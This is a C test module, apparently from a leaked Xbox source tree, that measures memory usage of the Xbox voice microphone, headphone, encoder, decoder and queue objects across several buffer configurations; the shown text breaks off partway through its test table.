=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xvoice\mem\main.c ===
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Copyright (c) Microsoft Corporation

Module Name:

  main.c

Abstract:

  This module tests XMO Voice memory usage

Author:

  Steven Kehrli (steveke) 20-Dec-2001

Environment:

  XBox

Revision History:

------------------------------------------------------------------------------*/

#include "precomp.h"



#define MAX_MICROPHONE       4
#define MAX_HEADPHONE        4
#define MAX_ENCODER          4
#define MAX_DECODER          4
#define MAX_QUEUE            4

#define MAX_PACKETS          10
#define MAX_THRESHOLD        25

#define VOICE_SAMPLING_RATE  8000
#define VOICE_BYTES_PER_MS   (VOICE_SAMPLING_RATE / 1000) * 2



VOID
GetDevices(
    IN OUT DWORD  *dwMicrophoneMask,
    IN OUT DWORD  *dwHeadphoneMask
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Gets all devices

Arguments:

  dwMicrophoneMask - Pointer to the bitmask of microphone devices
  dwHeadphoneMask - Pointer to the bitmask of headphone devices

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // dwInsertions is the device mask of insertions
    DWORD  dwInsertions;
    // dwRemovals is the device mask of removals
    DWORD  dwRemovals;
    // dwCurrentDevice is a counter to enumerate each device
    DWORD  dwCurrentDevice;
    // dwObject is a counter to enumerate device changes
    DWORD  dwObject;



    // Get the microphones
    *dwMicrophoneMask = XGetDevices(XDEVICE_TYPE_VOICE_MICROPHONE);

    // Get the headphones
    *dwHeadphoneMask = XGetDevices(XDEVICE_TYPE_VOICE_HEADPHONE);

    for (dwObject = 0; dwObject < 40 && (((XDEVICE_PORT0_MASK | XDEVICE_PORT1_MASK | XDEVICE_PORT2_MASK | XDEVICE_PORT3_MASK) != *dwMicrophoneMask) || ((XDEVICE_PORT0_MASK | XDEVICE_PORT1_MASK | XDEVICE_PORT2_MASK | XDEVICE_PORT3_MASK) != *dwHeadphoneMask)); dwObject++) {
        Sleep(200);

        if (FALSE == XGetDeviceChanges(XDEVICE_TYPE_VOICE_MICROPHONE, &dwInsertions, &dwRemovals)) {
            dwInsertions = 0;
            dwRemovals = 0;
        }

        for (dwCurrentDevice = 0; dwCurrentDevice < XGetPortCount(); dwCurrentDevice++) {
            // Remove the device if it has been removed
            if ((1 << dwCurrentDevice) & dwRemovals) {
                *dwMicrophoneMask &= ~(1 << dwCurrentDevice);
            }

            // Add the device if it has been inserted
            if ((1 << dwCurrentDevice) & dwInsertions) {
                *dwMicrophoneMask |= (1 << dwCurrentDevice);
            }
        }

        if (FALSE == XGetDeviceChanges(XDEVICE_TYPE_VOICE_HEADPHONE, &dwInsertions, &dwRemovals)) {
            dwInsertions = 0;
            dwRemovals = 0;
        }

        for (dwCurrentDevice = 0; dwCurrentDevice < XGetPortCount(); dwCurrentDevice++) {
            // Remove the device if it has been removed
            if ((1 << dwCurrentDevice) & dwRemovals) {
                *dwHeadphoneMask &= ~(1 << dwCurrentDevice);
            }

            // Add the device if it has been inserted
            if ((1 << dwCurrentDevice) & dwInsertions) {
                *dwHeadphoneMask |= (1 << dwCurrentDevice);
            }
        }
    };
}



BOOL
DeviceInit(
    IN HANDLE  hLog
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Initializes all devices

Arguments:

  hLog - Handle to the log object

Return Value:

  TRUE on success

------------------------------------------------------------------------------*/
{
    // dwMicrophoneMask is the microphone device mask
    DWORD  dwMicrophoneMask;
    // dwHeadphoneMask is the headphone device mask
    DWORD  dwHeadphoneMask;



    Log_va(hLog, TRUE, "**********\r\nDeviceInit\r\n**********\r\n");
    Log_va(hLog, TRUE, "Please ensure four (4) Xbox Communicators are connected.\r\n");
    Log_va(hLog, TRUE, "Enumerating devices...\r\n");

    // Initialize the devices
    XInitDevices(0, NULL);

    // Get the devices
    GetDevices(&dwMicrophoneMask, &dwHeadphoneMask);

    if (0 == (XDEVICE_PORT0_MASK & dwMicrophoneMask)) {
        Log_va(hLog, TRUE, "    Microphone missing in Port 0\r\n");
    }

    if (0 == (XDEVICE_PORT1_MASK & dwMicrophoneMask)) {
        Log_va(hLog, TRUE, "    Microphone missing in Port 1\r\n");
    }

    if (0 == (XDEVICE_PORT2_MASK & dwMicrophoneMask)) {
        Log_va(hLog, TRUE, "    Microphone missing in Port 2\r\n");
    }

    if (0 == (XDEVICE_PORT3_MASK & dwMicrophoneMask)) {
        Log_va(hLog, TRUE, "    Microphone missing in Port 3\r\n");
    }

    if (0 == (XDEVICE_PORT0_MASK & dwHeadphoneMask)) {
        Log_va(hLog, TRUE, "    Headphone missing in Port 0\r\n");
    }

    if (0 == (XDEVICE_PORT1_MASK & dwHeadphoneMask)) {
        Log_va(hLog, TRUE, "    Headphone missing in Port 1\r\n");
    }

    if (0 == (XDEVICE_PORT2_MASK & dwHeadphoneMask)) {
        Log_va(hLog, TRUE, "    Headphone missing in Port 2\r\n");
    }

    if (0 == (XDEVICE_PORT3_MASK & dwHeadphoneMask)) {
        Log_va(hLog, TRUE, "    Headphone missing in Port 3\r\n");
    }

    Log_va(hLog, TRUE, "**********\r\n\r\n");

    return (((XDEVICE_PORT0_MASK | XDEVICE_PORT1_MASK | XDEVICE_PORT2_MASK | XDEVICE_PORT3_MASK) == dwMicrophoneMask) || ((XDEVICE_PORT0_MASK | XDEVICE_PORT1_MASK | XDEVICE_PORT2_MASK | XDEVICE_PORT3_MASK) == dwHeadphoneMask));
}



VOID
MediaProcess(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszTestName,
    IN  HANDLE  hMemObject,
    IN  DWORD   dwNumObjects,
    IN  DWORD   dwCodecTag,
    IN  WORD    wNumPackets,
    IN  WORD    wMsOfDataPerPacket
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Processes media

Arguments:

  hMemObject - Handle to the memory objet
  dwNumObjects - Number of objects
  dwCodecTag - Specifies the codec
  wNumPackets - Specifies the number of packets
  wMsOfDataPerPacket - Milliseconds of voice data per packet

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // pMicrophonePacket is the array of microphone packets
    XMEDIAPACKET            *pMicrophonePacket[MAX_MICROPHONE];
    // pHeadphonePacket is the array of headphone packets
    XMEDIAPACKET            *pHeadphonePacket[MAX_HEADPHONE];
    // pEncoderPacket is the encoder packet
    XMEDIAPACKET            *pEncoderPacket[MAX_ENCODER];
    // pDecoderPacket is the decoder packet
    XMEDIAPACKET            *pDecoderPacket[MAX_DECODER];
    // pQueuePacket is the queue packet
    XMEDIAPACKET            *pQueuePacket[MAX_QUEUE];
    // pQueueInfoPacket is the queue packet
    XMEDIAPACKET            *pQueueInfoPacket[MAX_QUEUE];
    // pQueueInfo is the queue packet info
    PCM_INFO                *pQueueInfo[MAX_QUEUE];
    // wEncoderSize is the size of the encoder packet buffer
    WORD                    wEncoderSize = 0;

    // hMicrophoneEvent is a handle to the microphone packet event
    HANDLE                  *hMicrophoneEvent = NULL;
    HANDLE                  *hMicrophoneEventArray[MAX_MICROPHONE];
    // hHeadphoneEvent is a handle to the headphone packet event
    HANDLE                  *hHeadphoneEvent = NULL;
    HANDLE                  *hHeadphoneEventArray[MAX_MICROPHONE];

    // wfxFormat is the wave format for the device
    WAVEFORMATEX            wfxFormat;
    // QueueConfig is the queue config for the object
    QUEUE_XMO_CONFIG        QueueConfig;
    // pMicrophoneObject is the array of microphone devices
    XMediaObject            *pMicrophoneObject[MAX_MICROPHONE];
    // pHeadphoneObject is the array of headphone devices
    XMediaObject            *pHeadphoneObject[MAX_HEADPHONE];
    // pEncoderObject is the encoder object
    XMediaObject            *pEncoderObject[MAX_ENCODER];
    // pDecoderObject is the decoder object
    XMediaObject            *pDecoderObject[MAX_DECODER];
    // pQueueObject is the array of queue objects
    XVoiceQueueMediaObject  *pQueueObject[MAX_QUEUE];
    // pQueueInfoObject is the array of queue objects
    XVoiceQueueMediaObject  *pQueueInfoObject[MAX_QUEUE];

    // dwObject is a counter to enumerate each object
    DWORD                   dwObject;
    // dwPacket is a counter to enumerate each packet
    DWORD                   dwPacket;
    // dwTime is the time of the test
    DWORD                   dwTime;

    // mmStats are the memory manager stats
    MM_STATISTICS           mmStatsInitial;
    MM_STATISTICS           mmStatsFinal;
    // psStats are the process manager stats
    PS_STATISTICS           psStatsInitial;
    PS_STATISTICS           psStatsFinal;



    // Initialize the variables
    ZeroMemory(pMicrophonePacket, sizeof(pMicrophonePacket));
    ZeroMemory(pHeadphonePacket, sizeof(pHeadphonePacket));
    ZeroMemory(pEncoderPacket, sizeof(pEncoderPacket));
    ZeroMemory(pDecoderPacket, sizeof(pDecoderPacket));    
    ZeroMemory(pQueuePacket, sizeof(pQueuePacket));
    ZeroMemory(pQueueInfoPacket, sizeof(pQueueInfoPacket));
    ZeroMemory(pQueueInfo, sizeof(pQueueInfo));

    ZeroMemory(hMicrophoneEventArray, sizeof(hMicrophoneEventArray));
    ZeroMemory(hHeadphoneEventArray, sizeof(hHeadphoneEventArray));

    ZeroMemory(pMicrophoneObject, sizeof(pMicrophoneObject));
    ZeroMemory(pHeadphoneObject, sizeof(pHeadphoneObject));
    ZeroMemory(pEncoderObject, sizeof(pEncoderObject));
    ZeroMemory(pDecoderObject, sizeof(pDecoderObject));
    ZeroMemory(pQueueObject, sizeof(pQueueObject));
    ZeroMemory(pQueueInfoObject, sizeof(pQueueInfoObject));



    // Initialize the wave format
    ZeroMemory(&wfxFormat, sizeof(wfxFormat));
    wfxFormat.wFormatTag = WAVE_FORMAT_PCM;
    wfxFormat.nChannels = 1;
    wfxFormat.nSamplesPerSec = VOICE_SAMPLING_RATE;
    wfxFormat.nAvgBytesPerSec = 2 * VOICE_SAMPLING_RATE;
    wfxFormat.nBlockAlign = 2;
    wfxFormat.wBitsPerSample = 16;
    wfxFormat.cbSize = 0;

    // Initialize the queue config
    ZeroMemory(&QueueConfig, sizeof(QueueConfig));
    QueueConfig.cbSize = sizeof(QueueConfig);
    QueueConfig.wVoiceSamplingRate = VOICE_SAMPLING_RATE;
    QueueConfig.dwCodecTag = dwCodecTag;
    QueueConfig.wMsOfDataPerPacket = wMsOfDataPerPacket;
    QueueConfig.wMaxDelay = wNumPackets * wMsOfDataPerPacket;



    // Create the devices and objects

    // Microphone
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        while (FAILED(XVoiceCreateMediaObject(XDEVICE_TYPE_VOICE_MICROPHONE, dwObject, wNumPackets, &wfxFormat, &pMicrophoneObject[dwObject]))) {
            Sleep(200);
        }
    }

    // Headphone
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        while (FAILED(XVoiceCreateMediaObject(XDEVICE_TYPE_VOICE_HEADPHONE, dwObject, wNumPackets, &wfxFormat, &pHeadphoneObject[dwObject]))) {
            Sleep(200);
        }
    }

    // Encoder
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        while (FAILED(XVoiceEncoderCreateMediaObject(FALSE, dwCodecTag, &wfxFormat, MAX_THRESHOLD, &pEncoderObject[dwObject]))) {
            Sleep(200);
        }
    }

    // Decoder
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        while (FAILED(XVoiceDecoderCreateMediaObject(dwCodecTag, &wfxFormat, &pDecoderObject[dwObject]))) {
            Sleep(200);
        }
    }

    // Queue
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        while (FAILED(XVoiceQueueCreateMediaObject(&QueueConfig, &pQueueObject[dwObject]))) {
            Sleep(200);
        }
    }

    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        while (FAILED(XVoiceQueueCreateMediaObject(&QueueConfig, &pQueueInfoObject[dwObject]))) {
            Sleep(200);
        }
    }



    // Determine the codec buffer size
    XVoiceGetCodecBufferSize(pEncoderObject[0], VOICE_BYTES_PER_MS * wMsOfDataPerPacket, &wEncoderSize);



    // Create the packets

    // Microphone
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        pMicrophonePacket[dwObject] = (XMEDIAPACKET *) xMemAlloc(hMemObject, (sizeof(XMEDIAPACKET) + sizeof(DWORD) * 2 + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets);
    }

    // Headphone
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        pHeadphonePacket[dwObject] = (XMEDIAPACKET *) xMemAlloc(hMemObject, (sizeof(XMEDIAPACKET) + sizeof(DWORD) * 2 + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets);
    }

    // Encoder
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        pEncoderPacket[dwObject] = (XMEDIAPACKET *) xMemAlloc(hMemObject, (sizeof(XMEDIAPACKET) + sizeof(DWORD) * 2 + wEncoderSize) * wNumPackets);
    }

    // Decoder
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        pDecoderPacket[dwObject] = (XMEDIAPACKET *) xMemAlloc(hMemObject, (sizeof(XMEDIAPACKET) + sizeof(DWORD) * 2 + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets);
    }

    // Queue
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        pQueuePacket[dwObject] = (XMEDIAPACKET *) xMemAlloc(hMemObject, (sizeof(XMEDIAPACKET) + sizeof(DWORD) * 2 + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets);
    }

    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        pQueueInfoPacket[dwObject] = (XMEDIAPACKET *) xMemAlloc(hMemObject, (sizeof(XMEDIAPACKET) + sizeof(DWORD) * 2 + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets);

        pQueueInfo[dwObject] = (PCM_INFO *) xMemAlloc(hMemObject, sizeof(PCM_INFO) * wNumPackets);
    }



    // Initialize the events

    // Microphone
    hMicrophoneEvent = (HANDLE *) xMemAlloc(hMemObject, sizeof(HANDLE) * dwNumObjects * wNumPackets);
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        hMicrophoneEventArray[dwObject] = (HANDLE *) ((UINT_PTR) hMicrophoneEvent + (sizeof(HANDLE) * dwObject * wNumPackets));

        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            hMicrophoneEventArray[dwObject][dwPacket] = CreateEvent(NULL, FALSE, FALSE, NULL);
        }
    }

    // Headphone
    hHeadphoneEvent = (HANDLE *) xMemAlloc(hMemObject, sizeof(HANDLE) * dwNumObjects * wNumPackets);
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        hHeadphoneEventArray[dwObject] = (HANDLE *) ((UINT_PTR) hHeadphoneEvent + (sizeof(HANDLE) * dwObject * wNumPackets));

        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            hHeadphoneEventArray[dwObject][dwPacket] = CreateEvent(NULL, FALSE, FALSE, NULL);
        }
    }



    // Initialize the packets

    // Microphone
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            pMicrophonePacket[dwObject][dwPacket].pvBuffer = (XMEDIAPACKET *) ((BYTE *) pMicrophonePacket[dwObject] + sizeof(XMEDIAPACKET) * wNumPackets + VOICE_BYTES_PER_MS * wMsOfDataPerPacket * dwPacket);
            pMicrophonePacket[dwObject][dwPacket].dwMaxSize = VOICE_BYTES_PER_MS * wMsOfDataPerPacket;
            pMicrophonePacket[dwObject][dwPacket].pdwCompletedSize = (LPDWORD) ((BYTE *) pMicrophonePacket[dwObject] + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * 2 * dwPacket);
            pMicrophonePacket[dwObject][dwPacket].pdwStatus = (LPDWORD) ((BYTE *) pMicrophonePacket[dwObject] + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * ( 2 * dwPacket + 1));
            pMicrophonePacket[dwObject][dwPacket].hCompletionEvent = hMicrophoneEventArray[dwObject][dwPacket];
        }
    }

    // Headphone
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            pHeadphonePacket[dwObject][dwPacket].pvBuffer = (XMEDIAPACKET *) ((BYTE *) pHeadphonePacket[dwObject] + sizeof(XMEDIAPACKET) * wNumPackets + VOICE_BYTES_PER_MS * wMsOfDataPerPacket * dwPacket);
            pHeadphonePacket[dwObject][dwPacket].dwMaxSize = VOICE_BYTES_PER_MS * wMsOfDataPerPacket;
            pHeadphonePacket[dwObject][dwPacket].pdwCompletedSize = (LPDWORD) ((BYTE *) pHeadphonePacket[dwObject] + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * 2 * dwPacket);
            pHeadphonePacket[dwObject][dwPacket].pdwStatus = (LPDWORD) ((BYTE *) pHeadphonePacket[dwObject] + (sizeof(XMEDIAPACKET) + VOICE_BYTES_PER_MS * wMsOfDataPerPacket) * wNumPackets + sizeof(DWORD) * ( 2 * dwPacket + 1));
            pHeadphonePacket[dwObject][dwPacket].hCompletionEvent = hHeadphoneEventArray[dwObject][dwPacket];
        }
    }

    // Encoder
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            pEncoderPacket[dwObject][dwPacket].pvBuffer = (XMEDIAPACKET *) ((BYTE *) pEncoderPacket[dwObject] + sizeof(XMEDIAPACKET) * wNumPackets + wEncoderSize * dwPacket);
            pEncoderPacket[dwObject][dwPacket].dwMaxSize = wEncoderSize;
            pEncoderPacket[dwObject][dwPacket].pdwCompletedSize = (LPDWORD) ((BYTE *) pEncoderPacket[dwObject] + (sizeof(XMEDIAPACKET) + wEncoderSize) * wNumPackets + sizeof(DWORD) * 2 * dwPacket);
            pEncoderPacket[dwObject][dwPacket].pdwStatus = (LPDWORD) ((BYTE *) pEncoderPacket[dwObject] + (sizeof(XMEDIAPACKET) + wEncoderSize) * wNumPackets + sizeof(DWORD) * ( 2 * dwPacket + 1));
        }
    }

    // Queue
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            pQueueInfo[dwObject][dwPacket].cbSize = sizeof(pQueueInfo[dwObject][dwPacket]);
        }
    }



    // Microphone

    Log_va(hLog, TRUE, "%s, Microphone\n", lpszTestName);

    // Submit the packets
    for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
        for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
            pMicrophoneObject[dwObject]->Process(NULL, &pMicrophonePacket[dwObject][dwPacket]);
        }
    }

    for (dwTime = 0; dwTime < 70000; dwTime += (wMsOfDataPerPacket * wNumPackets)) {
        if (10000 > dwTime) {
            // Get the stats
            GetStats(&mmStatsInitial, &psStatsInitial);
        }

        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
                // Wait for a packet
                WaitForSingleObject(hMicrophoneEventArray[dwObject][dwPacket], INFINITE);

                // Resubmit the packet
                pMicrophoneObject[dwObject]->Process(NULL, &pMicrophonePacket[dwObject][dwPacket]);
            }
        }
    }

    // Get the stats
    GetStats(&mmStatsFinal, &psStatsFinal);

    // Check the stats
    CheckStats(INVALID_HANDLE_VALUE, &mmStatsInitial, &mmStatsFinal, &psStatsInitial, &psStatsFinal);

    // Wait for the packets
    WaitForMultipleObjects(wNumPackets * dwNumObjects, (HANDLE *) hMicrophoneEvent, TRUE, INFINITE);



    // Encoder

    Log_va(hLog, TRUE, "%s, Encoder\n", lpszTestName);

    for (dwTime = 0; dwTime < 70000; dwTime += (wMsOfDataPerPacket * wNumPackets)) {
        if (10000 > dwTime) {
            // Get the stats
            GetStats(&mmStatsInitial, &psStatsInitial);
        }

        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
                pEncoderObject[dwObject]->Process(&pMicrophonePacket[dwObject][dwPacket], &pEncoderPacket[dwObject][dwPacket]);
            }
        }
    }

    // Get the stats
    GetStats(&mmStatsFinal, &psStatsFinal);

    // Check the stats
    CheckStats(INVALID_HANDLE_VALUE, &mmStatsInitial, &mmStatsFinal, &psStatsInitial, &psStatsFinal);



    // Decoder

    Log_va(hLog, TRUE, "%s, Decoder\n", lpszTestName);

    for (dwTime = 0; dwTime < 70000; dwTime += (wMsOfDataPerPacket * wNumPackets)) {
        if (10000 > dwTime) {
            // Get the stats
            GetStats(&mmStatsInitial, &psStatsInitial);
        }

        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
                pDecoderObject[dwObject]->Process(&pEncoderPacket[dwObject][dwPacket], &pHeadphonePacket[dwObject][dwPacket]);
            }
        }
    }

    // Get the stats
    GetStats(&mmStatsFinal, &psStatsFinal);

    // Check the stats
    CheckStats(INVALID_HANDLE_VALUE, &mmStatsInitial, &mmStatsFinal, &psStatsInitial, &psStatsFinal);



    // Queue

    Log_va(hLog, TRUE, "%s, Queue\n", lpszTestName);

    // Submit the packets
    for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
        for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
            pQueueObject[dwObject]->Process(&pEncoderPacket[dwObject][dwPacket], NULL);
        }
    }

    for (dwTime = 0; dwTime < 70000; dwTime += (wMsOfDataPerPacket * wNumPackets)) {
        if (10000 > dwTime) {
            // Get the stats
            GetStats(&mmStatsInitial, &psStatsInitial);
        }

        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
                // Wait for a packet
                while (FAILED(pQueueObject[dwObject]->Process(NULL, &pHeadphonePacket[dwObject][dwPacket]))) {
                    Sleep(wMsOfDataPerPacket);
                }

                // Resubmit the packet
                pQueueObject[dwObject]->Process(&pEncoderPacket[dwObject][dwPacket], NULL);
            }
        }
    }

    // Get the stats
    GetStats(&mmStatsFinal, &psStatsFinal);

    // Check the stats
    CheckStats(INVALID_HANDLE_VALUE, &mmStatsInitial, &mmStatsFinal, &psStatsInitial, &psStatsFinal);



    // Queue & OutputInfo

    Log_va(hLog, TRUE, "%s, Queue & OutputInfo\n", lpszTestName);

    // Submit the packets
    for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
        for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
            pQueueInfoObject[dwObject]->Process(&pEncoderPacket[dwObject][dwPacket], NULL);
        }
    }

    for (dwTime = 0; dwTime < 70000; dwTime += (wMsOfDataPerPacket * wNumPackets)) {
        if (10000 > dwTime) {
            // Get the stats
            GetStats(&mmStatsInitial, &psStatsInitial);
        }

        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
                // Wait for a packet
                while (FAILED(pQueueInfoObject[dwObject]->Process(NULL, &pHeadphonePacket[dwObject][dwPacket]))) {
                    Sleep(wMsOfDataPerPacket);
                }

                // Get the last info
                pQueueInfoObject[dwObject]->GetLastOutputInfo(&pQueueInfo[dwObject][dwPacket]);

                // Resubmit the packet
                pQueueInfoObject[dwObject]->Process(&pEncoderPacket[dwObject][dwPacket], NULL);
            }
        }
    }

    // Get the stats
    GetStats(&mmStatsFinal, &psStatsFinal);

    // Check the stats
    CheckStats(INVALID_HANDLE_VALUE, &mmStatsInitial, &mmStatsFinal, &psStatsInitial, &psStatsFinal);



    // Headphone

    Log_va(hLog, TRUE, "%s, Headphone\n", lpszTestName);

    // Submit the packets
    for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
        for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
            pHeadphoneObject[dwObject]->Process(&pHeadphonePacket[dwObject][dwPacket], NULL);
        }
    }

    for (dwTime = 0; dwTime < 70000; dwTime += (wMsOfDataPerPacket * wNumPackets)) {
        if (10000 > dwTime) {
            // Get the stats
            GetStats(&mmStatsInitial, &psStatsInitial);
        }

        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
                // Wait for a packet
                WaitForSingleObject(hHeadphoneEventArray[dwObject][dwPacket], INFINITE);

                // Resubmit the packet
                pHeadphoneObject[dwObject]->Process(&pHeadphonePacket[dwObject][dwPacket], NULL);
            }
        }
    }

    // Get the stats
    GetStats(&mmStatsFinal, &psStatsFinal);

    // Check the stats
    CheckStats(INVALID_HANDLE_VALUE, &mmStatsInitial, &mmStatsFinal, &psStatsInitial, &psStatsFinal);

    // Wait for the packets
    WaitForMultipleObjects(wNumPackets * dwNumObjects, (HANDLE *) hHeadphoneEvent, TRUE, INFINITE);



    // Free the devices and objects

    // Microphone
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        // Close the device
        pMicrophoneObject[dwObject]->Release();
    }

    // Headphone
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        // Close the device
        pHeadphoneObject[dwObject]->Release();
    }

    // Encoder
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        // Close the device
        pEncoderObject[dwObject]->Release();
    }

    // Decoder
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        // Close the device
        pDecoderObject[dwObject]->Release();
    }

    // Queue
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        // Close the device
        pQueueObject[dwObject]->Release();
    }

    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        // Close the device
        pQueueInfoObject[dwObject]->Release();
    }



    // Free the events

    // Microphone
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            CloseHandle(hMicrophoneEventArray[dwObject][dwPacket]);
        }
    }
    xMemFree(hMemObject, hMicrophoneEvent);

    // Headphone
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            CloseHandle(hHeadphoneEventArray[dwObject][dwPacket]);
        }
    }
    xMemFree(hMemObject, hHeadphoneEvent);



    // Free the packets

    // Microphone
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        xMemFree(hMemObject, pMicrophonePacket[dwObject]);
    }

    // Headphone
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        xMemFree(hMemObject, pHeadphonePacket[dwObject]);
    }

    // Encoder
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        xMemFree(hMemObject, pEncoderPacket[dwObject]);
    }

    // Decoder
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        xMemFree(hMemObject, pDecoderPacket[dwObject]);
    }

    // Queue
    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        xMemFree(hMemObject, pQueuePacket[dwObject]);
    }

    for (dwObject = 0; dwObject < dwNumObjects; dwObject++) {
        xMemFree(hMemObject, pQueueInfoPacket[dwObject]);
        xMemFree(hMemObject, pQueueInfo[dwObject]);
    }
}



typedef VOID (*PMEDIA_PROCESS_FUNCTION) (
    IN  HANDLE  hLog,
    IN  LPSTR   lpszTestName,
    IN  HANDLE  hMemObject,
    IN  DWORD   dwNumObjects,
    IN  DWORD   dwCodecTag,
    IN  WORD    wNumPackets,
    IN  WORD    wMsOfDataPerPacket
);

typedef struct _MEDIA_PROCESS_FUNCTION_TABLE {
    PMEDIA_PROCESS_FUNCTION  pFunction;
    LPSTR                    lpszTestName;
    DWORD                    dwNumObjects;
    DWORD                    dwCodecTag;
    WORD                     wNumPackets;
    WORD                     wMsOfDataPerPacket;
} MEDIA_PROCESS_FUNCTION_TABLE, *PMEDIA_PROCESS_FUNCTION_TABLE;

static MEDIA_PROCESS_FUNCTION_TABLE MediaProcessFunctionTable[] = {
    { MediaProcess, "Process, 10 Buffers, 20ms, Voxware SC03, 1",  1, WAVE_FORMAT_VOXWARE_SC03, 10, 20  },
    { MediaProcess, "Process, 10 Buffers, 20ms, Voxware SC03, 4",  4, WAVE_FORMAT_VOXWARE_SC03, 10, 20  },
    { MediaProcess, "Process, 50 Buffers, 20ms, Voxware SC03, 1",  1, WAVE_FORMAT_VOXWARE_SC03, 50, 20  },
    { MediaProcess, "Process, 50 Buffers, 20ms, Voxware SC03, 4",  4, WAVE_FORMAT_VOXWARE_SC03, 50, 20  },
    { MediaProcess, "Process, 5 Buffers, 40ms, Voxware SC03, 1",   1, WAVE_FORMAT_VOXWARE_SC03, 5,  40  },
    { MediaProcess, "Process, 5 Buffers, 40ms, Voxware SC03, 4",   4, WAVE_FORMAT_VOXWARE_SC03, 5,  40  },
    { MediaProcess, "Process, 25 Buffers, 40ms, Voxware SC03, 1",  1, WAVE_FORMAT_VOXWARE_SC03, 25, 40  },
    { MediaProcess, "Process, 25 Buffers, 40ms, Voxware SC03, 4",  4, WAVE_FORMAT_VOXWARE_SC03, 25, 40  },
    { MediaProcess, "Process, 2 Buffers, 100ms, Voxware SC03, 1",  1, WAVE_FORMAT_VOXWARE_SC03, 2,  100 },
    { MediaProcess, "Process, 2 Buffers, 100ms, Voxware SC03, 4",  4, WAVE_FORMAT_VOXWARE_SC03, 2,  100 },
    { MediaProcess, "Process, 10 Buffers, 100ms, Voxware SC03, 1", 1, WAVE_FORMAT_VOXWARE_SC03, 10, 100 },
